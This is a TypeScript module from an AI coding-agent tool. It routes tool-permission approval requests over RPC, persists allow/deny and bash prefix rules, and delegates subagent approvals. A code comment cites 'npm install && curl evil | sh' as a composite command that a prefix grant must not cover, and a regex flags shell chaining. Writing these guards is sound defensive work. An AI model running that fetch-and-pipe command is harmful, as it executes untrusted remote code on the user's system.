/**
 * Fork-extension tool permission approval (requirement 4.1, rpc-ui-protocol.md).
 *
 * Routes the ACP permission gateway (`session/session-tools.ts`
 * `#wrapToolForAcpPermission`) through the RPC transport: the controller
 * implements the stock `ClientBridge.requestPermission` interface, emits a
 * structured `permission_request` frame, and settles it from the
 * `permission_response` bypass frame. Option semantics, in-memory session
 * grants, and fail-closed behavior stay in the existing gateway; persistence
 * reuses the `tools.approval.<tool>` config keys (hot reload applies them to
 * future calls, so an allowed policy stops emitting frames).
 *
 * Subagent sessions delegate through a process-level delegate installed on v3
 * activation; `task/executor.ts` injects an origin-tagged bridge at subagent
 * spawn/revive when (and only when) the delegate is registered, so TUI/ACP
 * paths keep building subagents exactly as before.
 */
import { Snowflake, isRecord } from "@oh-my-pi/pi-utils";
import { ToolError } from "@oh-my-pi/pi-tui/tools/tool-errors";
import type {
	ClientBridge,
	ClientBridgePermissionOutcome,
	ClientBridgePermissionToolCall,
} from "../../session/client-bridge";
import type { AgentSession } from "../../session/agent-session";
import type { AgentTool } from "@oh-my-pi/pi-agent-core";
import {
	type ApprovalMode,
	type ResolvedApproval,
	denyError,
	resolveApproval,
	resolveApprovalFromContext,
} from "../../tools/approval";
import { PERMISSION_REQUIRED_TOOLS } from "../../session/acp-permission-gate";
import { cfgToolsApproval, cfgToolsApprovalMode, cfgToolsApprovalPrefixes } from "../../tools/settings";
import type { Settings } from "../../config/settings";
import type { RpcForkHost } from "./rpc-fork-host";
import type { RpcForkCommandBase } from "./rpc-fork-types";
import type { RpcResponse } from "./rpc-types";

/** Origin attached to permission requests raised inside a subagent session. */
export interface RpcPermissionOrigin {
	subagentId: string;
	agentType: string;
}

/** Server → client: structured tool approval request (v3 only). */
export interface RpcForkPermissionRequestFrame {
	type: "permission_request";
	id: string;
	toolCallId: string;
	toolName: string;
	tier: "read" | "write" | "exec";
	reason?: string;
	approvalMode: ApprovalMode;
	details: string[];
	input: unknown;
	origin?: RpcPermissionOrigin;
	/** 4.1 prefix tier: suggested command prefix for `allow_always_prefix` (bash). */
	prefixSuggestion?: string;
}

/** Client → server bypass frame settling a permission_request. */
export interface RpcForkPermissionResponseFrame {
	type: "permission_response";
	id: string;
	option: "allow_once" | "allow_session" | "allow_always" | "allow_always_prefix" | "reject_once" | "reject_always";
	feedback?: string;
}

const PERMISSION_RESPONSE_OPTIONS = new Set([
	"allow_once",
	"allow_session",
	"allow_always",
	"allow_always_prefix",
	"reject_once",
	"reject_always",
]);

/** Fail-closed rejection for permission requests raised after client disconnect. */
const DISCONNECTED_PERMISSION_ERROR = "RPC client disconnected before permission could be requested";

/** First-token command prefix used by the `allow_always_prefix` tier (bash). */
function bashPrefixSuggestion(args: unknown): string | undefined {
	const command = isRecord(args) && typeof args.command === "string" ? args.command.trim() : "";
	if (!command) return undefined;
	const firstToken = command.split(/\s+/)[0];
	return firstToken ? `${firstToken} ` : undefined;
}

/**
 * Shell separators/operators that mark a command as a composition. A user's
 * prefix approval is the intent to allow ONE command shape; a composite
 * command (`npm install && curl evil | sh`) never inherits that grant, so any
 * of these fall back to the approval frame. Single `&`/`|` are matched too —
 * strictly treating them as compositions is acceptable (a rare false prompt
 * beats a silent allow). Process substitution (`<(cmd)` / `>(cmd)`) runs an
 * arbitrary inner command without any `;|&` separator, so it counts as a
 * composition as well.
 */
const SHELL_COMPOSITE = /[;|&`]|\$\(|\r|\n|<\(|>\(/;

/** True when the bash command is a single command starting with one of the
 * persisted prefix rules. */
function matchesApprovedPrefix(settings: Settings | undefined, toolName: string, args: unknown): boolean {
	if (!settings) return false;
	const command = isRecord(args) && typeof args.command === "string" ? args.command : undefined;
	if (!command) return false;
	if (SHELL_COMPOSITE.test(command)) return false;
	const prefixes = cfgToolsApprovalPrefixes.get(settings) as Record<string, unknown>;
	const rules = prefixes[toolName];
	if (!Array.isArray(rules)) return false;
	const normalized = command.trim();
	return rules.some(rule => typeof rule === "string" && rule.length > 0 && normalized.startsWith(rule));
}

const MAX_PERMISSION_INPUT_CHARS = 32 * 1024;

/** Bounded truncation for the structured `input` preview payload. */
function boundedInput(input: unknown): unknown {
	let serialized: string | undefined;
	try {
		serialized = JSON.stringify(input ?? null);
	} catch {
		return null;
	}
	if (serialized.length <= MAX_PERMISSION_INPUT_CHARS) return input;
	return serialized.slice(0, MAX_PERMISSION_INPUT_CHARS);
}

function normalizeDetails(details: string | string[] | undefined): string[] {
	if (details === undefined) return [];
	if (typeof details === "string") return details ? [details] : [];
	return details.filter(line => typeof line === "string" && line.length > 0);
}

function selectedOutcome(
	optionId: "allow_once" | "allow_always" | "reject_once" | "reject_always",
): ClientBridgePermissionOutcome {
	return { outcome: "selected", optionId, kind: optionId };
}

interface PendingPermissionRequest {
	settle: (response: PermissionResponse) => void;
	fail: (error: Error) => void;
	/** Echoed for `allow_always_prefix`: the suggested prefix this request carried. */
	prefixSuggestion?: string;
}

/** Validated `permission_response` payload handed to the awaiting gate. */
interface PermissionResponse {
	option: "allow_once" | "allow_session" | "allow_always" | "allow_always_prefix" | "reject_once" | "reject_always";
	feedback?: string;
}

interface PermissionResolutionHost {
	readonly settings: Settings | undefined;
	readonly tools: readonly AgentTool[];
}

/**
 * Core approval flow shared by the main-session bridge and subagent
 * delegation: resolve policy from the live settings, short-circuit allow/deny
 * without a frame, and otherwise emit `permission_request` and await
 * `permission_response`.
 */
async function requestRpcPermission(
	host: PermissionResolutionHost,
	pending: Map<string, PendingPermissionRequest>,
	emit: (frame: object) => void,
	toolCall: ClientBridgePermissionToolCall,
	signal: AbortSignal | undefined,
	origin?: RpcPermissionOrigin,
): Promise<ClientBridgePermissionOutcome> {
	const toolName = toolCall.toolName;
	const tool = host.tools.find(candidate => candidate.name === toolName) ?? ({ name: toolName } as AgentTool);
	const args = toolCall.rawInput;
	const { approvalMode, userPolicies } = resolveApprovalFromContext(
		host.settings ? { settings: host.settings } : undefined,
	);
	const resolved: ResolvedApproval = resolveApproval(tool, args, approvalMode, userPolicies);
	if (resolved.policy === "deny") throw denyError(resolved, toolName);
	if (resolved.policy === "allow") return selectedOutcome("allow_once");
	// Prefix tier: a persisted prefix rule auto-approves without a frame.
	if (matchesApprovedPrefix(host.settings, toolName, args)) return selectedOutcome("allow_once");
	const prefixSuggestion = toolName === "bash" ? bashPrefixSuggestion(args) : undefined;

	const id = Snowflake.next() as string;
	const { promise, resolve, reject } = Promise.withResolvers<PermissionResponse | undefined>();
	let settled = false;
	const finishSettle = (settle: () => void) => {
		if (settled) return;
		settled = true;
		signal?.removeEventListener("abort", onAbort);
		pending.delete(id);
		settle();
	};
	const onAbort = () => finishSettle(() => resolve(undefined));
	signal?.addEventListener("abort", onAbort, { once: true });
	const pendingRecord: PendingPermissionRequest = {
		settle: response => finishSettle(() => resolve(response)),
		fail: error => finishSettle(() => reject(error)),
		...(prefixSuggestion ? { prefixSuggestion } : {}),
	};
	pending.set(id, pendingRecord);

	const request: RpcForkPermissionRequestFrame = {
		type: "permission_request",
		id,
		toolCallId: toolCall.toolCallId,
		toolName,
		tier: resolved.tier,
		...(resolved.reason ? { reason: resolved.reason } : {}),
		approvalMode,
		details: normalizeDetails(tool.formatApprovalDetails?.(args)),
		input: boundedInput(args),
		...(prefixSuggestion ? { prefixSuggestion } : {}),
		...(origin ? { origin } : {}),
	};
	emit(request);
	const response = await promise;
	if (!response) return { outcome: "cancelled" };
	const feedback =
		typeof response.feedback === "string" && response.feedback.trim() ? response.feedback.trim() : undefined;
	switch (response.option) {
		case "allow_once":
			return selectedOutcome("allow_once");
		case "allow_session":
			// The gateway's in-memory map is the session grant (ACP semantics).
			return selectedOutcome("allow_always");
		case "allow_always": {
			if (!host.settings) throw new ToolError(`Cannot persist tool approval: session settings unavailable`);
			cfgToolsApproval.setEntry(host.settings, toolName, "allow");
			return selectedOutcome("allow_always");
		}
		case "allow_always_prefix": {
			// Prefix tier persists ONLY the prefix rule — the whole-tool policy
			// stays untouched so other commands keep prompting.
			if (!host.settings) throw new ToolError(`Cannot persist tool approval: session settings unavailable`);
			const prefix = pendingRecord.prefixSuggestion;
			if (prefix) {
				const prefixes = cfgToolsApprovalPrefixes.get(host.settings) as Record<string, unknown>;
				const existing = Array.isArray(prefixes[toolName])
					? (prefixes[toolName] as unknown[]).filter((rule): rule is string => typeof rule === "string")
					: [];
				if (!existing.includes(prefix)) {
					cfgToolsApprovalPrefixes.setEntry(host.settings, toolName, [...existing, prefix]);
				}
			}
			return selectedOutcome("allow_once");
		}
		case "reject_once":
			if (feedback) throw new ToolError(`Tool call denied by user (${toolName}): ${feedback}`);
			return selectedOutcome("reject_once");
		case "reject_always": {
			if (!host.settings) throw new ToolError(`Cannot persist tool denial: session settings unavailable`);
			cfgToolsApproval.setEntry(host.settings, toolName, "deny");
			if (feedback) throw new ToolError(`Tool call denied by user (${toolName}): ${feedback}`);
			return selectedOutcome("reject_always");
		}
	}
}

type RpcSubagentPermissionDelegate = (request: {
	subagentId: string;
	agentType: string;
	toolCall: ClientBridgePermissionToolCall;
	signal: AbortSignal | undefined;
}) => Promise<ClientBridgePermissionOutcome>;

const subagentDelegates = new WeakMap<Settings, RpcSubagentPermissionDelegate>();

/** Registered by the RPC fork controller on v3 activation; inert everywhere else. */
export function getRpcSubagentPermissionDelegate(settings: Settings): RpcSubagentPermissionDelegate | undefined {
	return subagentDelegates.get(settings);
}

/**
 * Bridge injected into subagent sessions by `task/executor.ts` when the RPC
 * delegate is registered. Origin-tagged requests settle on the main
 * connection's permission surface.
 */
export function createRpcSubagentPermissionBridge(
	origin: RpcPermissionOrigin,
	delegate: RpcSubagentPermissionDelegate,
): ClientBridge {
	return {
		capabilities: { requestPermission: true },
		requestPermission: (toolCall, _options, signal) => {
			return delegate({ subagentId: origin.subagentId, agentType: origin.agentType, toolCall, signal });
		},
	};
}

/**
 * Scopes subagent approval for delegation: without touching the unattended
 * yolo overlay (the upstream authorization for headless subagents — its
 * wholesale removal would push non-bridged tools into hard failures), the
 * four gateway-covered tools get explicit session-local `prompt` policies so
 * their calls route through the delegated bridge with the origin badge.
 * Gated on the RPC v3 delegate; writes stay on the subagent's own settings
 * layer and never reach the parent or the global config file.
 */
export function scopeSubagentApprovalForDelegation(
	session: AgentSession,
	delegate?: RpcSubagentPermissionDelegate,
): void {
	if (!delegate) return;
	if (!session.settings) return;
	// Nested tasks inherit this same owner; disposed owners still fail closed.
	subagentDelegates.set(session.settings, delegate);
	for (const tool of Object.keys(PERMISSION_REQUIRED_TOOLS)) {
		cfgToolsApproval.setEntry(session.settings, tool, "prompt");
	}
}

const APPROVAL_MODES = ["always-ask", "write", "yolo"] as const;

function isApprovalMode(value: string): value is (typeof APPROVAL_MODES)[number] {
	return (APPROVAL_MODES as readonly string[]).includes(value);
}

/** Owns the v3 permission surface: bridge activation, frames, and `set_approval_mode`. */
export class RpcForkPermissionController {
	readonly #pending = new Map<string, PendingPermissionRequest>();
	#active = false;
	/** Set on dispose: installed bridges stay in place, so their entries fail closed. */
	#disposed = false;

	constructor(
		private readonly host: RpcForkHost,
		private readonly session: AgentSession,
		private readonly options: { projectMode?: boolean } = {},
	) {
		host.registerFrameHandler(parsed => this.#handleFrame(parsed));
		host.registerDisposer(reason => this.#dispose(reason));
		host.registerActivation(() => this.#activate());
		host.registerCommand("set_approval_mode", command => this.#setApprovalMode(command));
	}

	/** Current tier mode as reported by `get_state` (live settings, yolo default parity). */
	static currentApprovalMode(session: AgentSession): ApprovalMode {
		return resolveApprovalFromContext(session.settings ? { settings: session.settings } : undefined).approvalMode;
	}

	#activate(): void {
		if (this.#active) return;
		this.#active = true;
		this.session.setClientBridge(this.#bridge());
		subagentDelegates.set(this.session.settings, ({ subagentId, agentType, toolCall, signal }) => {
			if (this.#disposed) return Promise.reject(new Error(DISCONNECTED_PERMISSION_ERROR));
			return requestRpcPermission(
				this.#resolutionHost(),
				this.#pending,
				frame => this.host.context.emit(frame),
				toolCall,
				signal,
				{ subagentId, agentType },
			);
		});
	}

	#bridge(): ClientBridge {
		return {
			capabilities: { requestPermission: true },
			requestPermission: (toolCall, _options, signal) => {
				if (this.#disposed) return Promise.reject(new Error(DISCONNECTED_PERMISSION_ERROR));
				return requestRpcPermission(
					this.#resolutionHost(),
					this.#pending,
					frame => this.host.context.emit(frame),
					toolCall,
					signal,
				);
			},
		};
	}

	#resolutionHost(): PermissionResolutionHost {
		return {
			settings: this.session.settings,
			tools: this.session.agent.state.tools,
		};
	}

	async #setApprovalMode(command: RpcForkCommandBase): Promise<RpcResponse> {
		const rawMode = (command as { mode?: unknown }).mode;
		if (typeof rawMode !== "string" || !isApprovalMode(rawMode)) {
			return this.host.context.error(
				command.id,
				"set_approval_mode",
				`Invalid approval mode: ${String(rawMode)} (expected always-ask, write, or yolo)`,
			);
		}
		const mode = rawMode;
		// Project sessions override only their own runtime layer. The legacy
		// single-session entry retains its persistent-default behavior.
		if (this.options.projectMode) cfgToolsApprovalMode.override(this.session.settings, mode);
		else cfgToolsApprovalMode.set(this.session.settings, mode);
		// Re-inject the bridge so the gateway re-wraps active tools for the new
		// mode (e.g. a yolo-started session switched to always-ask starts
		// emitting permission_request frames); the setter internally runs
		// refreshAcpPermissionGates, and the #active guard already keeps the
		// subagent delegate from being installed twice.
		this.session.setClientBridge(this.#bridge());
		return this.host.context.success(command.id, "set_approval_mode", { approvalMode: mode });
	}

	#handleFrame(parsed: unknown): boolean {
		if (!isRecord(parsed) || parsed.type !== "permission_response") return false;
		if (typeof parsed.id !== "string") return false;
		const pending = this.#pending.get(parsed.id);
		if (!pending) return true;
		const option = parsed.option;
		if (typeof option !== "string" || !PERMISSION_RESPONSE_OPTIONS.has(option)) {
			pending.fail(new Error(`Permission response used unknown option: ${String(option)}`));
			return true;
		}
		pending.settle({
			option: option as PermissionResponse["option"],
			...(typeof parsed.feedback === "string" ? { feedback: parsed.feedback } : {}),
		});
		return true;
	}

	#dispose(reason: string): void {
		this.#disposed = true;
		for (const pending of this.#pending.values()) {
			pending.fail(new Error(reason));
		}
		this.#pending.clear();
		subagentDelegates.delete(this.session.settings);
		this.#active = false;
	}
}
